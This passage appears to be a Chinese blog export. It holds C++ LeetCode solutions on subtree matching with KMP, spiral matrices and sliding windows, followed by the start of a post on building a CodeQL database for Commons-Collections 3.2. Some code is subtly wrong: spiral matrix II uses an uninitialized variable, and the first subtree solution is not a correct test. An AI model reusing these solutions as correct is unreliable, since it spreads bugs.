<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left),</span></span><br><span class="line"><span class="comment"> * right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; preOrder;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; inOrder;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 思路,根据二叉树构造那里,可以采用先序+中序确定唯一的一颗二叉树</span></span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">rootOrder</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">subRootOrder</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="built_in">traversal</span>(root, rootOrder);</span><br><span class="line">        <span class="built_in">traversal</span>(subRoot, subRootOrder);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strStr</span>(rootOrder[<span class="number">0</span>], subRootOrder[<span class="number">0</span>]) &amp;&amp;</span><br><span class="line">            <span class="built_in">strStr</span>(rootOrder[<span class="number">1</span>], subRootOrder[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root, vector&lt;string&gt;&amp; twoOrder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        twoOrder[<span class="number">0</span>].<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">traversal</span>(root-&gt;left, twoOrder);</span><br><span class="line">        twoOrder[<span class="number">1</span>].<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">traversal</span>(root-&gt;right, twoOrder);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; next = <span class="built_in">getNext</span>(needle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; haystack.<span class="built_in">length</span>() &amp;&amp; j &lt; needle.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == needle.<span class="built_in">length</span>()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (needle[j] == haystack[i]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == needle.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getNext</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">next</span><span class="params">(pattern.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pattern.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">-1</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> cn = <span class="number">0</span>; <span class="comment">// 因为i对应的前一个元素的next值为0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; next.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pattern[i - <span class="number">1</span>] == pattern[cn]) &#123;</span><br><span class="line">                next[i++] = ++cn;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cn &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 往前跳找最长前缀</span></span><br><span class="line">                cn = next[cn];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 跳到头了</span></span><br><span class="line">                next[i++] = <span class="number">0</span>; <span class="comment">// 最长公共前后缀就是0了</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="序列化-kmp解法"><a href="#序列化-kmp解法" class="headerlink" title="序列化+kmp解法"></a>序列化+kmp解法</h5><p>由于序列化能唯一确定一棵树的结构,所以采用序列化的结果通过kmp进行比较</p>
<p>采用先序序列化,把序列化后数组中的每个字符串当成一个单独的字符来进行kmp比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; s1;</span><br><span class="line">        vector&lt;string&gt; s2;</span><br><span class="line">        <span class="built_in">serial</span>(root, s1);</span><br><span class="line">        <span class="built_in">serial</span>(subRoot, s2);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; next = <span class="built_in">getNext</span>(s2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kmp</span>(s1, s2, next);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">serial</span><span class="params">(TreeNode* root, vector&lt;string&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            path.<span class="built_in">push_back</span>(<span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        path.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(root-&gt;val));</span><br><span class="line">        <span class="built_in">serial</span>(root-&gt;left, path);</span><br><span class="line">        <span class="built_in">serial</span>(root-&gt;right, path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">kmp</span><span class="params">(vector&lt;string&gt;&amp; s1, vector&lt;string&gt;&amp; s2, vector&lt;<span class="keyword">int</span>&gt; next)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; s1.<span class="built_in">size</span>() &amp;&amp; j &lt; s2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i] == s2[j]) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == s2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getNext</span><span class="params">(vector&lt;string&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">next</span><span class="params">(path.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> cn = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; path.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (path[i - <span class="number">1</span>] == path[cn]) &#123;</span><br><span class="line">                next[i++] = ++cn;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cn &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cn = next[cn];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                next[i++] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459. 重复的子字符串"></a><a href="https://leetcode.cn/problems/repeated-substring-pattern/">459. 重复的子字符串</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011133478.png" alt="image-20241001113328430"></p>
<h5 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> res = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// i获取子串结束位置</span></span><br><span class="line">            <span class="keyword">int</span> len = i - <span class="number">0</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> k = <span class="number">1</span>;<span class="comment">//k表示当前循环了几个子串的长度,并用于后面计算j和子串之间的位置关系</span></span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//用于计数以更新k</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == s[j - k * len]) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    <span class="keyword">if</span> (count % len == <span class="number">0</span>) &#123;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">if</span> (j == s.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                            res = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//重新选子串</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="kmp解法"><a href="#kmp解法" class="headerlink" title="kmp解法"></a>kmp解法</h5>]]></content>
      <tags>
        <tag>-c++ - 算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数组</title>
    <url>/2024/09/28/%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h4 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="209. 长度最小的子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度最小的子数组</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011131322.png" alt="image-20241001113144266"></p>
<p>思路：这道题的要求是连续的子数组大于等于target</p>
<p>采用滑动窗口(像蛇一样蠕动前行)的思想</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> right = <span class="number">0</span>; right &lt; nums.<span class="built_in">size</span>(); right++) &#123;</span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= target) &#123;<span class="comment">//注意这里是while，让left一直动到动不了为止</span></span><br><span class="line">                res = <span class="built_in">min</span>(res, right - left + <span class="number">1</span>);</span><br><span class="line">                sum -= nums[left];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (res == INT_MAX) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>思考：为什么是滑动窗口呢？</p>
<p>因为他是一个正整数数组，当从头开始加连续的数大于等于target的时候，有可能头部的数比较小，移除了之后不影响他大于等于target，这样子尝试每次记录下最小的满足条件的长度。</p>
<h4 id="54-螺旋矩阵"><a href="#54-螺旋矩阵" class="headerlink" title="54. 螺旋矩阵"></a><a href="https://leetcode.cn/problems/spiral-matrix/">54. 螺旋矩阵</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011132139.png" alt="image-20241001113201083"></p>
<p>设置4个变量分别为up,down,left,right，采用闭区间限制当前这圈的范围</p>
<p>结束某一个for循环后就判断当前的四边形框是不是合法，不合法说明没有元素可以遍历了，直接退出</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> down = matrix.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = matrix[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                <span class="comment">// 采用左闭右闭，因为循环结束后up要直接++</span></span><br><span class="line">                res.<span class="built_in">push_back</span>(matrix[up][i]);</span><br><span class="line">            &#125;</span><br><span class="line">            up++;</span><br><span class="line">            <span class="keyword">if</span> (up &gt; down) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down; i++) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(matrix[i][right]);</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; left) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left; i--) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(matrix[down][i]);</span><br><span class="line">            &#125;</span><br><span class="line">            down--;</span><br><span class="line">            <span class="keyword">if</span> (up &gt; down) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up; i--) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(matrix[i][left]);</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            <span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="59-螺旋矩阵-II"><a href="#59-螺旋矩阵-II" class="headerlink" title="59. 螺旋矩阵 II"></a><a href="https://leetcode.cn/problems/spiral-matrix-ii/">59. 螺旋矩阵 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011132463.png" alt="image-20241001113211418"></p>
<p>本题思路和代码类比上一题即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">generateMatrix</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">matrix</span>(n, vector&lt;<span class="keyword">int</span>&gt;(n));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> left;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> down = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                <span class="comment">// 采用左闭右闭，因为循环结束后up要直接++</span></span><br><span class="line">                matrix[up][i] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            up++;</span><br><span class="line">            <span class="keyword">if</span> (up &gt; down) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down; i++) &#123;</span><br><span class="line">                matrix[i][right] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; left) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left; i--) &#123;</span><br><span class="line">                matrix[down][i] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            down--;</span><br><span class="line">            <span class="keyword">if</span> (up &gt; down) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up; i--) &#123;</span><br><span class="line">                matrix[i][left] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            <span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>构建Connons-Colletions3.2_x 的Codeql数据库</title>
    <url>/2022/05/06/%E6%9E%84%E5%BB%BAConnons-Colletions3.2_x%20%E7%9A%84Codeql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="构建Connons-Colletions3-2-x-的Codeql数据库"><a href="#构建Connons-Colletions3-2-x-的Codeql数据库" class="headerlink" title="构建Connons-Colletions3.2_x 的Codeql数据库"></a>构建Connons-Colletions3.2_x 的Codeql数据库</h1><p>安装配置好codeql也有一段时间了,期间看了一些简单的语法和例子,最近学校期末了,老师安排的屁事有点多,导致好几天没学习了</p>
<p>之前就听说codeql分析利用链特别厉害,java中反序列化利用链最出名的就是cc链了吧(个人观点),我学习codeql的目标就是自己能仿照着编写cc链的ql语句</p>
<p>但是codeql现在的java模块有个问题,就是生成数据库的时候,只能生成一个项目的代码数据库,它的依赖只有在代码中引入并加载的类才会被添加到数据库当中去</p>
<p>对此,我去github提问了一下(这也是我第一次在github提问…)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4e3482e87f6c59f7fb66e9d7f4c6645b.png" alt="image-20220512152353868"></p>
<p>这是维护者大佬做出的回复</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05cf854bb259eefe20bbb18ed9314c4d.png" alt="image-20220512152328284"></p>
<p>总而言之,就是想分析哪个依赖,就得单独为它创建数据库,我点了大佬的链接进去,下载下来的数据库是cc4的最新版本的数据库,可能是因为master分支放的是cc4吧…..</p>
<p>那没办法只能自己建cc3的库了…..</p>
<p>于是参照这篇文章<a href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
<p>这篇文章中提到两种数据库获取方式,第一种就是去lgtm直接下载,第二种是自己clone一份代码下来,然后上传到github仓库并配置lgtm让lgtm扫描后再去下载数据库,但是转念一想,既然它能生成,那我自己用clone的代码来搞不也一样吗</p>
<p>于是开始了痛苦之路</p>
<h2 id="建立CC3数据库"><a href="#建立CC3数据库" class="headerlink" title="建立CC3数据库"></a>建立CC3数据库</h2><p>接下来的东西需要对git的基础命令和原理有一定的了解,可以先去b站看<a href="https://www.bilibili.com/video/BV1FE411P7B3?spm_id_from=333.337.search-card.all.click">狂神的git视频</a>学习一下</p>
<p>git clone并切换源码到指定分支</p>
<p>先打开git bash  然后 clone cc项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/commons-collections.git</span><br></pre></td></tr></table></figure>

<p>接下来cd进入项目目录,切换分支为cc3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout COLLECTIONS_3_2_X</span><br></pre></td></tr></table></figure>

<blockquote>
<p>错误方式</p>
</blockquote>
<p>一看里面有pom.xml文件,大喜过望,开始mvn clean install生成数据库,然后一个大大的fatal甩在脸上……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>

<p>之前的文章中说过,生成数据库出错了不能着急,要一步步排查,首先codeql命令行是不会给出具体的错误提示的,只会说是mvn这条命令报错了</p>
<p>总的来说有两个错误,我们一一来分析解决</p>
<h4 id="错误一"><a href="#错误一" class="headerlink" title="错误一"></a>错误一</h4><p>然后我们打开idea,在idea命令行中使用mvn clean install –file pom.xml进行编译,出现了这样返回类型不一致的报错,打开报错的类的源码,发现这几个名字牛逼轰轰的Map类中remove方法返回的是Object类型的,这和其间接继承的Map接口中定义的boolean截然不同,怪不得报错</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8d6d61815dec7b21aa543fcb46fa45c0.png" alt="image-20220512153751430"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bc39db9b1d776707a9b8c386825b546c.png" alt="image-20220512154328441"></p>
<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>当我在idea的Project Structure中把jdk版本从平时用的1.8下调到1.7的时候,这个报错就消失了,欧耶!!!</p>
<h4 id="错误二"><a href="#错误二" class="headerlink" title="错误二"></a>错误二</h4><p>但是与此同时,还有个问题也发生了,使用idea右侧边连的maven 依次 clean和install的时候,报了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">错误: 不再支持目标选项 1.2。请使用 7 或更高版本。</span><br></pre></td></tr></table></figure>

<p>的错误</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5c58d7e1dc433f315606b54789280a6c.png" alt="image-20220512154036543"></p>
<p>去百度之后发现大概意思就是说,jdk版本太低了,咋了咋了的</p>
<p>在cc3的pom.xml最下面发现它自己指定了编译的jdk版本是1.2</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b7c35e183f5f612933fc48656b934440.png" alt="image-20220512154601318"></p>
<h6 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h6><p>为了一次性到位,首先把pom.xml中的版本改成1.7</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fdf861fb56261b5ff30edf2d38ee09a3.png" alt="image-20220512154736745"></p>
<p>接着在最下面的plugins中添加这两个</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220512154819016.png" alt="image-20220512154819016" style="zoom:80%;" />

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">testFailureIgnore</span>&gt;</span>true<span class="tag">&lt;/<span class="name">testFailureIgnore</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且,打开本地maven的setting.xml文件</p>
<p>找到对应的位置,就是<code>&lt;profiles&gt;</code>标签下面就行,添加如下语句,指定默认jdk版本</p>
